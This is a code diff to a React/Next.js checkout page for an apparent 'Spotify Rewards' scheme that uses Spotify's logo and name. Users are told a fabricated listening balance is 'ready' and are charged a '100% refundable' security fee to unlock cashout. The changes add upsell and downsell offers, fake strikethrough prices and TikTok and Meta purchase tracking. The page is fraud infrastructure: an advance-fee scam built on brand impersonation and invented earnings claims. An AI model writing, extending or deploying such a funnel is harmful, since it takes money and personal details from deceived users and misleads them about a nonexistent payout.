   { code: 'ES', name: 'Spain' },
   { code: 'IT', name: 'Italy' },
   { code: 'PT', name: 'Portugal' },
-  { code: 'JP', name: 'Japan' },
   { code: 'MX', name: 'Mexico' },
   { code: 'AR', name: 'Argentina' },
   { code: 'CO', name: 'Colombia' },
   { code: 'CL', name: 'Chile' },
   { code: 'PE', name: 'Peru' },
+  { code: 'JP', name: 'Japan' },
   { code: 'IN', name: 'India' },
-  { code: 'CN', name: 'China' },
-  { code: 'KR', name: 'South Korea' },
-  { code: 'ZA', name: 'South Africa' },
-  { code: 'NZ', name: 'New Zealand' },
-  { code: 'NL', name: 'Netherlands' },
-  { code: 'CH', name: 'Switzerland' },
-  { code: 'SE', name: 'Sweden' },
-  { code: 'NO', name: 'Norway' },
-  { code: 'DK', name: 'Denmark' },
-  { code: 'FI', name: 'Finland' },
-  { code: 'IE', name: 'Ireland' },
-  { code: 'SG', name: 'Singapore' },
-  { code: 'AE', name: 'United Arab Emirates' },
-  { code: 'AF', name: 'Afghanistan' },
-  { code: 'AL', name: 'Albania' },
-  { code: 'DZ', name: 'Algeria' },
-  { code: 'AD', name: 'Andorra' },
-  { code: 'AO', name: 'Angola' },
-  { code: 'AG', name: 'Antigua and Barbuda' },
-  { code: 'AM', name: 'Armenia' },
-  { code: 'AT', name: 'Austria' },
-  { code: 'AZ', name: 'Azerbaijan' },
-  { code: 'BS', name: 'Bahamas' },
-  { code: 'BH', name: 'Bahrain' },
-  { code: 'BD', name: 'Bangladesh' },
-  { code: 'BB', name: 'Barbados' },
-  { code: 'BY', name: 'Belarus' },
-  { code: 'BE', name: 'Belgium' },
-  { code: 'BZ', name: 'Belize' },
-  { code: 'BJ', name: 'Benin' },
-  { code: 'BT', name: 'Bhutan' },
-  { code: 'BO', name: 'Bolivia' },
-  { code: 'BA', name: 'Bosnia and Herzegovina' },
-  { code: 'BW', name: 'Botswana' },
-  { code: 'BN', name: 'Brunei' },
-  { code: 'BG', name: 'Bulgaria' },
-  { code: 'BF', name: 'Burkina Faso' },
-  { code: 'BI', name: 'Burundi' },
-  { code: 'CV', name: 'Cabo Verde' },
-  { code: 'KH', name: 'Cambodia' },
-  { code: 'CM', name: 'Cameroon' },
-  { code: 'CF', name: 'Central African Republic' },
-  { code: 'TD', name: 'Chad' },
-  { code: 'KM', name: 'Comoros' },
-  { code: 'CG', name: 'Congo' },
-  { code: 'CR', name: 'Costa Rica' },
-  { code: 'HR', name: 'Croatia' },
-  { code: 'CU', name: 'Cuba' },
-  { code: 'CY', name: 'Cyprus' },
-  { code: 'CZ', name: 'Czechia' },
-  { code: 'DJ', name: 'Djibouti' },
-  { code: 'DM', name: 'Dominica' },
-  { code: 'DO', name: 'Dominican Republic' },
-  { code: 'EC', name: 'Ecuador' },
-  { code: 'EG', name: 'Egypt' },
-  { code: 'SV', name: 'El Salvador' },
-  { code: 'GQ', name: 'Equatorial Guinea' },
-  { code: 'ER', name: 'Eritrea' },
-  { code: 'EE', name: 'Estonia' },
-  { code: 'SZ', name: 'Eswatini' },
-  { code: 'ET', name: 'Ethiopia' },
-  { code: 'FJ', name: 'Fiji' },
-  { code: 'GA', name: 'Gabon' },
-  { code: 'GM', name: 'Gambia' },
-  { code: 'GE', name: 'Georgia' },
-  { code: 'GH', name: 'Ghana' },
-  { code: 'GR', name: 'Greece' },
-  { code: 'GD', name: 'Grenada' },
-  { code: 'GT', name: 'Guatemala' },
-  { code: 'GN', name: 'Guinea' },
-  { code: 'GW', name: 'Guinea-Bissau' },
-  { code: 'GY', name: 'Guyana' },
-  { code: 'HT', name: 'Haiti' },
-  { code: 'HN', name: 'Honduras' },
-  { code: 'HU', name: 'Hungary' },
-  { code: 'IS', name: 'Iceland' },
-  { code: 'ID', name: 'Indonesia' },
-  { code: 'IR', name: 'Iran' },
-  { code: 'IQ', name: 'Iraq' },
-  { code: 'IL', name: 'Israel' },
-  { code: 'JM', name: 'Jamaica' },
-  { code: 'JO', name: 'Jordan' },
-  { code: 'KZ', name: 'Kazakhstan' },
-  { code: 'KE', name: 'Kenya' },
-  { code: 'KI', name: 'Kiribati' },
-  { code: 'KW', name: 'Kuwait' },
-  { code: 'KG', name: 'Kyrgyzstan' },
-  { code: 'LA', name: 'Laos' },
-  { code: 'LV', name: 'Latvia' },
-  { code: 'LB', name: 'Lebanon' },
-  { code: 'LS', name: 'Lesotho' },
-  { code: 'LR', name: 'Liberia' },
-  { code: 'LY', name: 'Libya' },
-  { code: 'LI', name: 'Liechtenstein' },
-  { code: 'LT', name: 'Lithuania' },
-  { code: 'LU', name: 'Luxembourg' },
-  { code: 'MG', name: 'Madagascar' },
-  { code: 'MW', name: 'Malawi' },
-  { code: 'MY', name: 'Malaysia' },
-  { code: 'MV', name: 'Maldives' },
-  { code: 'ML', name: 'Mali' },
-  { code: 'MT', name: 'Malta' },
-  { code: 'MH', name: 'Marshall Islands' },
-  { code: 'MR', name: 'Mauritania' },
-  { code: 'MU', name: 'Mauritius' },
-  { code: 'FM', name: 'Micronesia' },
-  { code: 'MD', name: 'Moldova' },
-  { code: 'MC', name: 'Monaco' },
-  { code: 'MN', name: 'Mongolia' },
-  { code: 'ME', name: 'Montenegro' },
-  { code: 'MA', name: 'Morocco' },
-  { code: 'MZ', name: 'Mozambique' },
-  { code: 'MM', name: 'Myanmar' },
-  { code: 'NA', name: 'Namibia' },
-  { code: 'NR', name: 'Nauru' },
-  { code: 'NP', name: 'Nepal' },
-  { code: 'NI', name: 'Nicaragua' },
-  { code: 'NE', name: 'Niger' },
-  { code: 'NG', name: 'Nigeria' },
-  { code: 'KP', name: 'North Korea' },
-  { code: 'MK', name: 'North Macedonia' },
-  { code: 'OM', name: 'Oman' },
-  { code: 'PK', name: 'Pakistan' },
-  { code: 'PW', name: 'Palau' },
-  { code: 'PS', name: 'Palestine' },
-  { code: 'PA', name: 'Panama' },
-  { code: 'PG', name: 'Papua New Guinea' },
-  { code: 'PY', name: 'Paraguay' },
-  { code: 'PH', name: 'Philippines' },
-  { code: 'PL', name: 'Poland' },
-  { code: 'QA', name: 'Qatar' },
-  { code: 'RO', name: 'Romania' },
-  { code: 'RU', name: 'Russia' },
-  { code: 'RW', name: 'Rwanda' },
-  { code: 'KN', name: 'Saint Kitts and Nevis' },
-  { code: 'LC', name: 'Saint Lucia' },
-  { code: 'VC', name: 'Saint Vincent and the Grenadines' },
-  { code: 'WS', name: 'Samoa' },
-  { code: 'SM', name: 'San Marino' },
-  { code: 'ST', name: 'Sao Tome and Principe' },
-  { code: 'SA', name: 'Saudi Arabia' },
-  { code: 'SN', name: 'Senegal' },
-  { code: 'RS', name: 'Serbia' },
-  { code: 'SC', name: 'Seychelles' },
-  { code: 'SL', name: 'Sierra Leone' },
-  { code: 'SK', name: 'Slovakia' },
-  { code: 'SI', name: 'Slovenia' },
-  { code: 'SB', name: 'Solomon Islands' },
-  { code: 'SO', name: 'Somalia' },
-  { code: 'SS', name: 'South Sudan' },
-  { code: 'LK', name: 'Sri Lanka' },
-  { code: 'SD', name: 'Sudan' },
-  { code: 'SR', name: 'Suriname' },
-  { code: 'SY', name: 'Syria' },
-  { code: 'TW', name: 'Taiwan' },
-  { code: 'TJ', name: 'Tajikistan' },
-  { code: 'TZ', name: 'Tanzania' },
-  { code: 'TH', name: 'Thailand' },
-  { code: 'TL', name: 'Timor-Leste' },
-  { code: 'TG', name: 'Togo' },
-  { code: 'TO', name: 'Tonga' },
-  { code: 'TT', name: 'Trinidad and Tobago' },
-  { code: 'TN', name: 'Tunisia' },
-  { code: 'TR', name: 'Turkey' },
-  { code: 'TM', name: 'Turkmenistan' },
-  { code: 'TV', name: 'Tuvalu' },
-  { code: 'UG', name: 'Uganda' },
-  { code: 'UA', name: 'Ukraine' },
-  { code: 'UY', name: 'Uruguay' },
-  { code: 'UZ', name: 'Uzbekistan' },
-  { code: 'VU', name: 'Vanuatu' },
-  { code: 'VA', name: 'Vatican City' },
-  { code: 'VE', name: 'Venezuela' },
-  { code: 'VN', name: 'Vietnam' },
-  { code: 'YE', name: 'Yemen' },
-  { code: 'ZM', name: 'Zambia' },
-  { code: 'ZW', name: 'Zimbabwe' },
 ];
 
-export default function PaymentPage() {
+function PaymentPageContent() {
   const router = useRouter();
+  const searchParams = useSearchParams();
 
-  // State from backend
+  const rawOfferParam = searchParams.get('offer') as OfferIdType | null;
+  const activeOfferId: OfferIdType =
+    rawOfferParam && OFFER_CHECKOUT_CONFIGS[rawOfferParam]
+      ? rawOfferParam
+      : 'front_9_00';
+  const offerConfig = OFFER_CHECKOUT_CONFIGS[activeOfferId];
+  const isUpsellCheckout = activeOfferId !== 'front_9_00';
+
   const [balanceData, setBalanceData] = useState<{
     balance: number;
     currency: string;
@@ -846,41 +1037,64 @@ export default function PaymentPage() {
     isDemo: true,
   });
 
-  // Client secret from Stripe backend
   const [clientSecret, setClientSecret] = useState<string | null>(null);
   const [isStripeLive, setIsStripeLive] = useState<boolean>(false);
-  const [chargeAmountFormatted, setChargeAmountFormatted] = useState<string>('9.00');
+  const [chargeAmountFormatted, setChargeAmountFormatted] = useState<string>(offerConfig.priceFormatted);
   const [isInitializingPayment, setIsInitializingPayment] = useState<boolean>(true);
 
-  // Form Fields
   const [fullName, setFullName] = useState('');
   const [email, setEmail] = useState('');
   const [country, setCountry] = useState('US');
-
-  // Success Confirmation Modal
   const [paymentSuccess, setPaymentSuccess] = useState(false);
 
-  // Auto-fill fullName and email from previous funnel steps and save lead to Supabase
+  // Sync price when offer param changes
+  useEffect(() => {
+    setChargeAmountFormatted(offerConfig.priceFormatted);
+  }, [offerConfig.priceFormatted]);
+
+  // Auto-fill fullName, email, and current balance from sessionStorage/localStorage
   useEffect(() => {
     if (typeof window !== 'undefined') {
-      const savedName = sessionStorage.getItem('spotify_listener_name');
+      const savedName =
+        sessionStorage.getItem('spotify_listener_name') ||
+        localStorage.getItem('spotify_listener_name');
+      const savedEmail =
+        sessionStorage.getItem('spotify_listener_email') ||
+        sessionStorage.getItem('spotify_current_user') ||
+        localStorage.getItem('spotify_listener_email');
+
       if (savedName && savedName.trim() && savedName !== 'MEU NOME') {
         setFullName(savedName.trim());
       }
-      const savedEmail = sessionStorage.getItem('spotify_listener_email');
       if (savedEmail && savedEmail.trim()) {
         const cleanEmail = savedEmail.trim();
         setEmail(cleanEmail);
+
+        // If user already has an accumulated balance in localStorage, show it!
+        const storedBal = localStorage.getItem('spotify_account_balance_' + cleanEmail.toLowerCase());
+        if (storedBal) {
+          const parsedBal = parseFloat(storedBal);
+          if (!isNaN(parsedBal) && parsedBal > 0) {
+            setBalanceData({
+              balance: parsedBal,
+              currency: 'USD',
+              formatted: `$${parsedBal.toFixed(2)}`,
+              isDemo: false,
+            });
+          }
+        }
+
         upsertCustomer({
           email: cleanEmail,
-          full_name: (savedName && savedName !== 'MEU NOME') ? savedName.trim() : undefined,
-        }).catch((err) => console.warn('Supabase lead auto-save notice:', err));
+          full_name: savedName && savedName !== 'MEU NOME' ? savedName.trim() : undefined,
+        }).catch(() => {});
       }
     }
   }, []);
 
-  // Load balance from backend
+  // Load balance from backend if front-end checkout
   useEffect(() => {
+    if (isUpsellCheckout) return;
     async function fetchBalance() {
       try {
         const res = await fetch('/api/user/balance');
@@ -888,63 +1102,36 @@ export default function PaymentPage() {
           const data = await res.json();
           setBalanceData(data);
         }
-      } catch (e) {
-        console.error('Failed to load user balance:', e);
-      }
+      } catch (e) {}
     }
     fetchBalance();
-  }, []);
+  }, [isUpsellCheckout]);
 
-  // Auto-detect user country via IP geolocation with fallback to browser language
-  useEffect(() => {
-    async function detectCountry() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        if (res.ok) {
-          const data = await res.json();
-          if (data && data.country_code && COUNTRIES_LIST.some(c => c.code === data.country_code)) {
-            setCountry(data.country_code);
-            return;
-          }
-        }
-      } catch (e) {}
-
-      try {
-        const res2 = await fetch('https://ipwho.is/');
-        if (res2.ok) {
-          const data2 = await res2.json();
-          if (data2 && data2.country_code && COUNTRIES_LIST.some(c => c.code === data2.country_code)) {
-            setCountry(data2.country_code);
-            return;
-          }
-        }
-      } catch (e) {}
-
-      if (navigator.language) {
-        const parts = navigator.language.split('-');
-        if (parts.length > 1) {
-          const inferred = parts[1].toUpperCase();
-          if (COUNTRIES_LIST.some(c => c.code === inferred)) {
-            setCountry(inferred);
-          }
-        }
-      }
-    }
-    detectCountry();
-  }, []);
-
-  // Initialize PaymentIntent from backend
+  // Initialize PaymentIntent for the specific offer
   useEffect(() => {
     async function initPayment() {
       setIsInitializingPayment(true);
       try {
+        const storedEmail =
+          typeof window !== 'undefined'
+            ? sessionStorage.getItem('spotify_listener_email') ||
+              sessionStorage.getItem('spotify_current_user') ||
+              ''
+            : '';
+        const storedName =
+          typeof window !== 'undefined'
+            ? sessionStorage.getItem('spotify_listener_name') || ''
+            : '';
+
         const res = await fetch('/api/stripe/create-payment-intent', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            email,
-            name: fullName,
-            sessionId: typeof window !== 'undefined' ? sessionStorage.getItem('spotify_session_id') : null,
+            offerId: activeOfferId,
+            email: email || storedEmail,
+            name: fullName || storedName,
+            sessionId:
+              typeof window !== 'undefined' ? sessionStorage.getItem('spotify_session_id') : null,
           }),
         });
 
@@ -957,7 +1144,6 @@ export default function PaymentPage() {
             setClientSecret(data.clientSecret);
             setIsStripeLive(true);
           } else {
-            // Mock test mode when keys are not in environment yet
             setIsStripeLive(false);
           }
         }
@@ -965,62 +1151,83 @@ export default function PaymentPage() {
         console.warn('Could not initialize Stripe intent, falling back to test mode:', err);
       } finally {
         setIsInitializingPayment(false);
-
-        // Notify Pushcut Venda Pendente strictly once per user session
-        try {
-          const hasNotifiedPending = sessionStorage.getItem('pushcut_pending_notified');
-          if (!hasNotifiedPending) {
-            sessionStorage.setItem('pushcut_pending_notified', 'true');
-            fetch('/api/pushcut', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                type: 'pending',
-                name: fullName || sessionStorage.getItem('spotify_listener_name') || 'Cliente',
-                email: email || sessionStorage.getItem('spotify_listener_email') || '',
-              }),
-            }).catch(() => {});
-          }
-        } catch {}
       }
     }
 
     initPayment();
-  }, []);
+  }, [activeOfferId]);
 
-  const handlePaymentSuccess = () => {
+  const handlePaymentSuccess = async () => {
     setPaymentSuccess(true);
 
+    const finalEmail =
+      email.trim() ||
+      (typeof window !== 'undefined'
+        ? sessionStorage.getItem('spotify_listener_email') ||
+          sessionStorage.getItem('spotify_current_user') ||
+          localStorage.getItem('spotify_listener_email') ||
+          'listener@spotifyrewards.com'
+        : 'listener@spotifyrewards.com');
+
+    const finalName =
+      fullName.trim() ||
+      (typeof window !== 'undefined'
+        ? sessionStorage.getItem('spotify_listener_name') ||
+          localStorage.getItem('spotify_listener_name') ||
+          'Verified Listener'
+        : 'Verified Listener');
+
     if (typeof window !== 'undefined') {
-      if (email) sessionStorage.setItem('spotify_listener_email', email.trim());
-      if (fullName) sessionStorage.setItem('spotify_listener_name', fullName.trim());
+      sessionStorage.setItem('spotify_logged_in', 'true');
+      sessionStorage.setItem('spotify_listener_email', finalEmail);
+      sessionStorage.setItem('spotify_listener_name', finalName);
+      localStorage.setItem('spotify_current_user', finalEmail);
+      localStorage.setItem('spotify_listener_email', finalEmail);
+      localStorage.setItem('spotify_listener_name', finalName);
+
+      if (!localStorage.getItem('spotify_payment_date')) {
+        const nowIso = new Date().toISOString();
+        sessionStorage.setItem('spotify_payment_date', nowIso);
+        localStorage.setItem('spotify_payment_date', nowIso);
+      }
     }
 
-    // Save transaction and user registration into Supabase database
-    recordPaymentInSupabase({
-      email: email || 'listener@verified.com',
-      full_name: fullName || 'Verified Listener',
-      amount: parseFloat(chargeAmountFormatted) || 9.0,
-      currency: 'usd',
-      status: 'succeeded',
-      accumulated_balance: balanceData.balance || 114.93,
-      country,
-    }).catch((err) => console.warn('Supabase client registration notice:', err));
+    // Track Purchase / CompletePayment on TikTok Pixel (DBRAD8BC77U7CBT5UTL0) + Meta Pixel + CAPI
+    trackFunnelPixelEvent(
+      'Purchase',
+      {
+        content_id: activeOfferId,
+        content_name: offerConfig.summaryTitle,
+        content_type: 'product',
+        value: offerConfig.price,
+        currency: 'USD',
+        num_items: 1,
+      },
+      {
+        email: finalEmail,
+        full_name: finalName,
+      }
+    );
 
-    // Automatically redirect to /spotify/welcome after 2.5s
+    // Unlock the specific Upsell/Downsell benefit ONLY now that payment is approved!
+    if (isUpsellCheckout) {
+      await unlockOfferBenefitAfterPayment(finalEmail, activeOfferId);
+    }
+
     setTimeout(() => {
-      router.push('/spotify/welcome');
-    }, 2500);
+      router.push(offerConfig.redirectUrl);
+    }, 2200);
   };
 
   return (
     <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased relative overflow-hidden selection:bg-[#1db954] selection:text-black">
-      {/* Meta Pixel & CAPI Checkout Tracker */}
       <MetaPixelTracker
         eventName="InitiateCheckout"
         customData={{
-          content_name: 'Anti-Spam Security Pass Checkout',
-          value: 9.0,
+          content_id: activeOfferId,
+          content_name: offerConfig.summaryTitle,
+          content_type: 'product',
+          value: offerConfig.price,
           currency: 'USD',
         }}
         userData={{
@@ -1028,15 +1235,16 @@ export default function PaymentPage() {
           full_name: fullName,
         }}
       />
-      {/* Background Radial Glow Accent matching reference image */}
-      <div className="absolute top-0 left-0 w-full h-[650px] bg-[radial-gradient(ellipse_80%_60%_at_25%_15%,rgba(29,185,84,0.18),rgba(15,35,22,0.45)_50%,transparent_80%)] pointer-events-none -z-10" />
 
-      {/* Ambient green dot grid / subtle noise */}
+      <div className="absolute top-0 left-0 w-full h-[650px] bg-[radial-gradient(ellipse_80%_60%_at_25%_15%,rgba(29,185,84,0.18),rgba(15,35,22,0.45)_50%,transparent_80%)] pointer-events-none -z-10" />
       <div className="absolute inset-0 bg-[linear-gradient(to_right,#1db95408_1px,transparent_1px),linear-gradient(to_bottom,#1db95408_1px,transparent_1px)] bg-[size:3rem_3rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] pointer-events-none -z-10" />
 
       {/* Top Header / Branding */}
-      <header className="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-4 flex items-center">
-        <Link href="/spotify" className="flex items-center gap-2.5 transition-opacity hover:opacity-90">
+      <header className="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-4 flex items-center justify-between">
+        <Link
+          href={isUpsellCheckout ? '/spotify/dashboard' : '/spotify'}
+          className="flex items-center gap-2.5 transition-opacity hover:opacity-90"
+        >
           <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
             <Image
               src="/spotify-logo.webp"
@@ -1048,114 +1256,95 @@ export default function PaymentPage() {
             />
           </div>
           <div className="flex items-center gap-1.5">
-            <span className="text-white font-extrabold text-lg sm:text-xl tracking-tight">Spotify</span>
+            <span className="text-white font-extrabold text-lg sm:text-xl tracking-tight">
+              Spotify
+            </span>
             <span className="bg-[#1db954] text-black text-[11px] font-black uppercase px-2 py-0.5 rounded-full tracking-wide">
               Rewards
             </span>
           </div>
         </Link>
+
+        {isUpsellCheckout && (
+          <Link
+            href="/spotify/dashboard"
+            className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full bg-[#111613] hover:bg-[#19221c] border border-[#243028] text-xs font-bold text-gray-300 hover:text-white transition-colors"
+          >
+            <ArrowLeft className="w-3.5 h-3.5 text-[#1db954]" />
+            <span>Back to Music Dashboard</span>
+          </Link>
+        )}
       </header>
 
-      {/* Main Content: 2-Column Desktop Grid / 1-Column Mobile Stack */}
+      {/* Main Content */}
       <main className="max-w-6xl mx-auto px-4 sm:px-6 py-6 sm:py-10">
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12 items-start">
-          {/* ========================================================= */}
-          {/* LEFT COLUMN: PROGRAM INFO & BENEFIT HIGHLIGHTS            */}
-          {/* ========================================================= */}
+          {/* LEFT COLUMN: PERSONALIZED PRODUCT / UPSELL DETAILS */}
           <div className="lg:col-span-6 space-y-6 pt-1">
-
-            {/* Main Heading */}
             <div>
+              <span className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-[#0d2215] text-[#1db954] border border-[#1db954]/40 text-xs font-black uppercase tracking-wider mb-4">
+                <Sparkles className="w-3.5 h-3.5" />
+                <span>{offerConfig.badgeText}</span>
+              </span>
+
               <h1 className="text-3xl sm:text-4xl md:text-5xl font-black text-white tracking-tight leading-tight">
-                Your <span className="text-[#1db954] font-black">{balanceData.formatted}</span> is Ready
+                {offerConfig.headingPrefix}{' '}
+                <span className="text-[#1db954] font-black">
+                  {activeOfferId === 'front_9_00'
+                    ? `${balanceData.formatted} is Ready`
+                    : offerConfig.headingHighlight}
+                </span>
               </h1>
 
               <p className="text-sm sm:text-base text-gray-300 mt-3 leading-relaxed">
-                Review your account information and available payment options. Complete listener verification to unlock instant cashout.
+                {offerConfig.subheading}
               </p>
             </div>
 
-            {/* Verification Pill Badge */}
-            <div>
-              <span className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-[#0d2215] text-[#1db954] border border-[#1db954]/40 text-xs font-black uppercase tracking-wider">
-                <span className="w-2 h-2 rounded-full bg-[#1db954] animate-pulse" />
-                INSTANT CASHOUT VERIFICATION
-              </span>
-            </div>
-
-            {/* Program Checklist Items with Green Checks */}
+            {/* Dynamic Feature Checklist */}
             <div className="space-y-4 pt-1">
-              {/* Item 1 */}
-              <div className="flex items-start gap-3.5">
-                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
-                  <Check className="w-3.5 h-3.5 stroke-[3]" />
+              {offerConfig.bullets.map((b, idx) => (
+                <div key={idx} className="flex items-start gap-3.5">
+                  <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
+                    <Check className="w-3.5 h-3.5 stroke-[3]" />
+                  </div>
+                  <div className="text-xs sm:text-sm text-gray-300 leading-snug">
+                    <b className="text-white font-bold">{b.bold}</b> {b.text}
+                  </div>
                 </div>
-                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
-                  <b className="text-white font-bold">Unlock Full Cashout:</b> Direct deposit of your {balanceData.formatted} to PayPal or Bank Account
-                </div>
-              </div>
-
-              {/* Item 2 */}
-              <div className="flex items-start gap-3.5">
-                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
-                  <Check className="w-3.5 h-3.5 stroke-[3]" />
-                </div>
-                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
-                  <b className="text-white font-bold">Daily Music Review Batches:</b> Receive up to 10 new songs daily (earn $45-$80 per review)
-                </div>
-              </div>
-
-              {/* Item 3 */}
-              <div className="flex items-start gap-3.5">
-                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
-                  <Check className="w-3.5 h-3.5 stroke-[3]" />
-                </div>
-                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
-                  <b className="text-white font-bold">Official Verified Listener Badge:</b> Priority payouts with zero processing delays
-                </div>
-              </div>
-
-              {/* Item 4 */}
-              <div className="flex items-start gap-3.5">
-                <div className="w-6 h-6 rounded-full border border-[#1db954] flex items-center justify-center text-[#1db954] shrink-0 mt-0.5 bg-[#1db954]/10">
-                  <Check className="w-3.5 h-3.5 stroke-[3]" />
-                </div>
-                <div className="text-xs sm:text-sm text-gray-300 leading-snug">
-                  <b className="text-white font-bold">100% Refundable Security Fee:</b> Automatically refunded back to your account together with your {balanceData.formatted} balance right after registration
-                </div>
-              </div>
+              ))}
             </div>
 
             {/* Bottom Guarantee Row */}
             <div className="pt-4 border-t border-white/5 flex flex-wrap items-center gap-4 sm:gap-6 text-xs text-gray-400 font-medium">
               <div className="flex items-center gap-1.5">
                 <Clock className="w-4 h-4 text-[#1db954]" />
-                <span>Instant Deposit</span>
+                <span>Instant Account Unlock</span>
               </div>
               <div className="flex items-center gap-1.5">
                 <ShieldCheck className="w-4 h-4 text-[#1db954]" />
-                <span>Bank-Grade Security</span>
+                <span>Bank-Grade 256-Bit SSL</span>
               </div>
               <div className="flex items-center gap-1.5">
-                <RefreshCw className="w-4 h-4 text-[#1db954]" />
-                <span>100% Refundable</span>
+                <TrendingUp className="w-4 h-4 text-[#1db954]" />
+                <span>Verified Listener Upgrade</span>
               </div>
             </div>
           </div>
 
-          {/* ========================================================= */}
-          {/* RIGHT COLUMN: INTEGRATED CHECKOUT CARD                    */}
-          {/* ========================================================= */}
+          {/* RIGHT COLUMN: INTEGRATED CHECKOUT CARD */}
           <div className="lg:col-span-6">
             <div className="rounded-3xl bg-[#0b0e0c] border border-[#1d2520] p-6 sm:p-8 shadow-2xl shadow-black relative backdrop-blur-xl">
               {/* Card Header: Accumulated Balance */}
               <div className="flex items-center justify-between pb-5 border-b border-[#1d2520] mb-6">
                 <div>
                   <span className="block text-[11px] font-extrabold uppercase tracking-widest text-[#8a9890]">
-                    ACCUMULATED BALANCE
+                    {isUpsellCheckout ? 'YOUR CURRENT LISTENER BALANCE' : 'ACCUMULATED BALANCE'}
                   </span>
                   <span className="text-xs text-[#8a9890] mt-0.5 block">
-                    Ready for release to your account
+                    {isUpsellCheckout
+                      ? 'Protected in your active listener account'
+                      : 'Ready for release to your account'}
                   </span>
                 </div>
                 <div className="text-3xl sm:text-4xl font-extrabold text-[#1db954] tracking-tight">
@@ -1163,15 +1352,28 @@ export default function PaymentPage() {
                 </div>
               </div>
 
-              {/* Order Summary & Pricing Distinction */}
-              <div className="mb-6 p-4 rounded-2xl bg-[#111613] border border-[#1f2722] flex items-center justify-between text-xs">
+              {/* Personalized Order Summary Box */}
+              <div className="mb-6 p-4 rounded-2xl bg-[#111613] border border-[#1db954]/30 flex items-center justify-between text-xs">
                 <div>
-                  <span className="font-bold text-white block text-sm">One-Time Anti-Spam Security Pass</span>
-                  <span className="text-[#8a9890] text-xs mt-0.5 block">Automatic refund within 1–2 hours</span>
+                  <span className="font-bold text-white block text-sm">
+                    {offerConfig.summaryTitle}
+                  </span>
+                  <span className="text-[#8a9890] text-xs mt-0.5 block">
+                    {offerConfig.summarySubtitle}
+                  </span>
                 </div>
-                <div className="text-right">
-                  <span className="text-base font-bold text-white block">${chargeAmountFormatted} USD</span>
-                  <span className="block text-xs text-[#1db954] font-semibold mt-0.5">100% Refundable</span>
+                <div className="text-right shrink-0 ml-3">
+                  {offerConfig.originalPriceFormatted && (
+                    <span className="text-xs text-gray-500 line-through mr-1.5">
+                      ${offerConfig.originalPriceFormatted}
+                    </span>
+                  )}
+                  <span className="text-base font-black text-white inline-block">
+                    ${chargeAmountFormatted} USD
+                  </span>
+                  <span className="block text-xs text-[#1db954] font-semibold mt-0.5">
+                    {offerConfig.summaryRightTag}
+                  </span>
                 </div>
               </div>
 
@@ -1179,10 +1381,9 @@ export default function PaymentPage() {
               {isInitializingPayment ? (
                 <div className="py-12 flex flex-col items-center justify-center gap-3 text-gray-400">
                   <RefreshCw className="w-6 h-6 animate-spin text-[#1db954]" />
-                  <span className="text-xs">Initializing secure payment gateway...</span>
+                  <span className="text-xs">Initializing secure checkout session...</span>
                 </div>
               ) : isStripeLive && clientSecret && stripePromise ? (
-                /* Real Stripe Payment Element */
                 <Elements
                   stripe={stripePromise}
                   options={{
@@ -1198,34 +1399,6 @@ export default function PaymentPage() {
                         fontFamily: 'system-ui, -apple-system, sans-serif',
                         borderRadius: '16px',
                       },
-                      rules: {
-                        '.Input': {
-                          borderColor: '#26312a',
-                          backgroundColor: '#131715',
-                          padding: '14px 16px',
-                        },
-                        '.Input:focus': {
-                          borderColor: '#1db954',
-                        },
-                        '.Tab': {
-                          borderColor: '#26312a',
-                          backgroundColor: '#131715',
-                          borderRadius: '16px',
-                          padding: '14px',
-                        },
-                        '.Tab--selected': {
-                          borderColor: '#1db954',
-                          backgroundColor: '#1db954',
-                          color: '#000000',
-                        },
-                        '.TabIcon--selected': {
-                          color: '#000000',
-                        },
-                        '.TabLabel--selected': {
-                          color: '#000000',
-                          fontWeight: '700',
-                        },
-                      },
                     },
                   }}
                 >
@@ -1236,12 +1409,11 @@ export default function PaymentPage() {
                     email={email}
                     setEmail={setEmail}
                     country={country}
-                    amountFormatted={chargeAmountFormatted}
+                    offerConfig={offerConfig}
                     onSuccess={handlePaymentSuccess}
                   />
                 </Elements>
               ) : (
-                /* High-Fidelity Test & Preview Mode */
                 <InteractiveMockPaymentForm
                   fullName={fullName}
                   setFullName={setFullName}
@@ -1249,7 +1421,7 @@ export default function PaymentPage() {
                   setEmail={setEmail}
                   country={country}
                   setCountry={setCountry}
-                  amountFormatted={chargeAmountFormatted}
+                  offerConfig={offerConfig}
                   onSuccess={handlePaymentSuccess}
                 />
               )}
@@ -1271,9 +1443,7 @@ export default function PaymentPage() {
         </div>
       </main>
 
-      {/* ========================================================= */}
-      {/* SUCCESS CONFIRMATION MODAL                                */}
-      {/* ========================================================= */}
+      {/* SUCCESS CONFIRMATION MODAL */}
       {paymentSuccess && (
         <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
           <div className="max-w-md w-full rounded-3xl bg-[#0e1410] border border-[#1db954]/50 p-6 sm:p-8 text-center shadow-2xl shadow-[#1db954]/20 animate-in fade-in zoom-in-95 duration-200">
@@ -1282,38 +1452,42 @@ export default function PaymentPage() {
             </div>
 
             <h3 className="text-2xl font-black text-white mb-2">
-              Payment &amp; Verification Confirmed!
